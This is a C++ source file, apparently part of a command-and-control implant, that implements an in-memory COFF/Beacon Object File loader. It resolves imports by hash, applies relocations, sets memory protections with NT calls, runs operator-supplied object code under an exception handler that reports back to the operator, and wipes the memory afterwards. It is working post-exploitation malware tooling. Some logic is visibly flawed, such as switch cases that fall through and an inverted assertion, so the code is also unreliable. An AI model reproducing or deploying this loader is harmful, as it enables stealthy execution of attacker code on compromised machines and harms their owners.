#include <core/include/objects.hpp>

using namespace Stream;
using namespace Utils::Scanners;
using namespace Utils;

namespace Objects {

    HASH_MAP RDATA loader_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    HASH_MAP RDATA implant_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    PVOID RDATA wrapper_return = nullptr;
    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = CreateTaskResponse(TypeError);

        exception->ContextRecord->IP_REG = U_PTR(wrapper_return);

        PackUint32(stream,   ERROR_UNHANDLED_EXCEPTION);
        PackUint32(stream,   exception->ExceptionRecord->ExceptionCode);
        PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        Dispatcher::MessageQueue(stream);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID WrapperFunction(void *address, void *args, size_t size) {

        auto function = (_obj_entry) address;

        wrapper_return = __builtin_extract_return_addr(__builtin_return_address(0));
        function((char*)args, size);
    }

    BOOL ProcessSymbol(char* sym_string, void** pointer) {

        bool success    = true;
        char *function  = { };

        *pointer = nullptr;

        // __imp_Beacon
        if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {

            function = sym_string + COFF_PREP_BEACON_SIZE;
            success_(MapScan(implant_map, HashStringA(function, MbsLength(function)), pointer));
        }
        // __imp_
        if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
            bool import = SymbolScan(sym_string, 0x24, MbsLength(sym_string)); // check for imports

            if (import) {
                auto count = 0;
                auto split = AllocSplit(sym_string + COFF_PREP_SYMBOL_SIZE, "$", &count);

                char buffer[MAX_PATH] = { };
                Trim(split[1], '@');

                auto lib_hash   = HashStringA(MbsToLower(buffer, split[0]), MbsLength(split[0]));
                auto fn_hash    = HashStringA(MbsToLower(buffer, split[1]), MbsLength(split[1]));

                FreeSplit(split, count);
                success_(C_PTR_HASHES(*pointer, lib_hash, fn_hash));
            }
            else {
                function = sym_string + COFF_PREP_SYMBOL_SIZE;
                Trim(function, '@');

                success_(MapScan(loader_map, HashStringA(function, MbsLength(function)), pointer));
            }
        }
        // .refptr.__instance
        if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {
            *pointer = (_hexane*) GLOBAL_OFFSET;
            success_(true);
        }

        defer:
        return success;
    }

    BOOL ExecuteFunction(_executable* object, char* function, void* args, size_t size) {

        void *veh_handle = { };
        void *entrypoint = { };
        char *sym_name   = { };

        bool success     = true;
        uint32_t protect = 0;

        // register veh as execution safety net
        x_assertb(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler));

        // set section memory attributes
        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = SECTION_HEADER(object->buffer, sec_index);

            if (object->section->SizeOfRawData > 0) {
                switch (object->section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                case PAGE_NOACCESS:         protect = PAGE_NOACCESS;
                case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE;
                case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY;
                case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY;
                case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ;
                case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY;
                case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE;
                case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE;
                default:
                    success_(false);
                }

                if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protect |= PAGE_NOCACHE;
                }

                x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &object->sec_map[sec_index].address, &object->sec_map[sec_index].size, protect, nullptr));
            }
        }

        if (object->fn_map->size) {
            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &object->fn_map->address, &object->fn_map->size, PAGE_READONLY, nullptr));
        }

        // get names from COFF symbol table and find entrypoint
        for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {

            if (object->symbols[sym_index].First.Value[0]) {
                sym_name = object->symbols[sym_index].First.Name; // inlined
            }
            else {
                sym_name = (char*)(object->symbols + object->nt_head->FileHeader.NumberOfSymbols) + object->symbols[sym_index].First.Value[1]; // not inlined
            }

            // compare symbolss to function names / entrypoint
            if (MemCompare(sym_name, function, MbsLength(function)) == 0) {
                entrypoint = object->sec_map[object->symbols[sym_index].SectionNumber - 1].address + object->symbols[sym_index].Value;

            }
        }

        // find section where entrypoint can be found and assert is RX
        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            if (entrypoint >= object->sec_map[sec_index].address && entrypoint < object->sec_map[sec_index].address + object->sec_map[sec_index].size) {

                object->section = SECTION_HEADER(object->buffer, sec_index);
                x_assertb((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE);
            }
        }

        WrapperFunction(entrypoint, args, size);

        defer:
        // deregister veh
        if (veh_handle) {
            Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handle);
        }

        return success;
    }

    VOID Cleanup(_executable *object) {

        void *pointer   = nullptr;
        size_t size     = 0;

        x_assert(object);
        x_assert(object->base);

        x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &object->base, &object->size, PAGE_READWRITE, nullptr));
        MemSet(object->base, 0, object->size);

        pointer = object->base;
        size    = object->size;

        x_ntassert(Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE));
        if (object->sec_map) {

            MemSet(object->sec_map, 0, object->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
            Free(object->sec_map);

            object->sec_map = nullptr;
        }

        defer:
    }

    BOOL BaseRelocation(_executable *object) {

        bool success        = true;
        uint32_t fn_count   = 0;

        void *function      = { };
        char *name_ptr      = { };
        char sym_name[9]    = { };

        const auto buffer = object->buffer;
        const auto symbols = object->symbols;

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {

            object->section = SECTION_HEADER(buffer, sec_index);
            object->reloc   = RELOC_SECTION(buffer, object->section);

            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
                _coff_symbol *symbol = &symbols[object->reloc->SymbolTableIndex];

                if (symbol->First.Value[0]) {
                    MemSet(sym_name, 0, 9);
                    MemCopy(sym_name, symbol->First.Name, 8);
                    name_ptr = sym_name;
                }
                else {
                    name_ptr = (char*) (symbols + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }

                void *reloc_addr  = object->sec_map[sec_index].address + object->reloc->VirtualAddress;
                void *sec_addr    = object->sec_map[symbol->SectionNumber - 1].address;
                void *fmap_addr   = object->fn_map + (fn_count * sizeof(void*));

                x_assertb(ProcessSymbol(name_ptr, &function));
#if _WIN64
                if (function) {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_AMD64_REL32: {
                            *(void**) fmap_addr        = function;
                            *(uint32_t*) reloc_addr    = U_PTR(fmap_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        }
                        default:
                            break;

                    }
                }
                else {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_AMD64_REL32:     *(uint32_t*) reloc_addr = (*(uint32_t*) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_ADDR32NB:  *(uint32_t*) reloc_addr = (*(uint32_t*) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_REL32_1:   *(uint32_t*) reloc_addr = (*(uint32_t*) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 1;
                        case IMAGE_REL_AMD64_REL32_2:   *(uint32_t*) reloc_addr = (*(uint32_t*) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 2;
                        case IMAGE_REL_AMD64_REL32_3:   *(uint32_t*) reloc_addr = (*(uint32_t*) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 3;
                        case IMAGE_REL_AMD64_REL32_4:   *(uint32_t*) reloc_addr = (*(uint32_t*) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 4;
                        case IMAGE_REL_AMD64_REL32_5:   *(uint32_t*) reloc_addr = (*(uint32_t*) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 5;
                        case IMAGE_REL_AMD64_ADDR64:    *(uint64_t*) reloc_addr = (*(uint64_t*) reloc_addr) + U_PTR(sec_addr);
                        default:
                            break;
                    }
                }
#else
                if (function) {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_I386_DIR32: {
                            *(void**) fmap_addr         = function;
                            *(uint32_t*) reloc_addr     = U_PTR(fmap_addr);
                        }
                        default:
                            break;
                    }
                }
                else {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_I386_DIR32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr);
                        case IMAGE_REL_I386_REL32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        default:
                            break;
                    }
                }
#endif
                object->reloc += sizeof(_reloc);
            }
        }

        defer:
        return success;
    }

    SIZE_T GetFunctionMapSize(_executable *object) {

        char sym_name[9]    = { };
        char *buffer        = nullptr;
        int counter         = 0;

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {

            object->section = SECTION_HEADER(object->buffer, sec_index);
            object->reloc   = RELOC_SECTION(object->buffer, object->section);

            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
                _coff_symbol *symbol = &object->symbols[object->reloc->SymbolTableIndex];

                if (symbol->First.Value[0]) {
                    MemSet(sym_name, 0, sizeof(sym_name));
                    MemCopy(sym_name, symbol->First.Name, 8);

                    buffer = sym_name;
                }
                else {
                    buffer = RVA(char*, object->symbols, object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }

                if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    counter++;
                }

                object->reloc = object->reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * counter;
    }

    VOID RemoveCoff(_executable *object) {

        _executable *prev = { };

        if (!object) {
            return;
        }

        for (auto head = Ctx->coffs; head; head = head->next) {
            if (head->task_id == object->task_id) {
                if (prev) {
                    prev->next = head->next;
                }
                else {
                    Ctx->coffs = head->next;
                }

                MemSet(object->buffer, 0, object->size);
                return;
            }

            prev = head;
        }
    }

    VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size, uint32_t task_id, bool cache) {

        _executable *object = { };
        uint8_t *next       = { };

        x_assert(data);
        object = Memory::Methods::CreateImageData((uint8_t*) data);
        object->task_id = task_id;
        object->next    = Ctx->coffs;

        Ctx->coffs = object;

        x_assert(Opsec::ImageCheckArch(object));
        x_assert(object->sec_map = (_object_map*) Malloc(sizeof(void*) * sizeof(_object_map)));

        object->fn_map->size = GetFunctionMapSize(object);

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = SECTION_HEADER(object->buffer, sec_index);
            object->size    += object->section->SizeOfRawData;
            object->size    = (size_t) PAGE_ALIGN(object->size);
        }

        object->size += object->fn_map->size;

        x_ntassert(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &object->base, NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        next = B_PTR(object->base);

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section                     = SECTION_HEADER(object->buffer, sec_index);
            object->sec_map[sec_index].size     = object->section->SizeOfRawData;
            object->sec_map[sec_index].address  = next;

            next += object->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            MemCopy(object->sec_map[sec_index].address, RVA(PBYTE, data, object->section->SizeOfRawData), object->section->SizeOfRawData);
        }

        object->fn_map = (_object_map*) next;

        x_assert(BaseRelocation(object));
        x_assert(ExecuteFunction(object, entrypoint, args, args_size));

        defer:
        Cleanup(object);

        if (!cache) {
            RemoveCoff(object);
        }

        if (object) {
            MemSet(object, 0, sizeof(_executable));
            Free(object);
        }
    }

    VOID CoffThread(_coff_params *params) {

        x_assert(!params->entrypoint || !params->data);
        CoffLoader(params->entrypoint, params->data, params->args, params->args_size, params->task_id, params-> b_cache);

        defer:
        ZeroFree(params->entrypoint, params->entrypoint_length);
        ZeroFree(params->data, params->data_size);
        ZeroFree(params->args, params->args_size);
        ZeroFree(params, sizeof(_coff_params));
    }
}
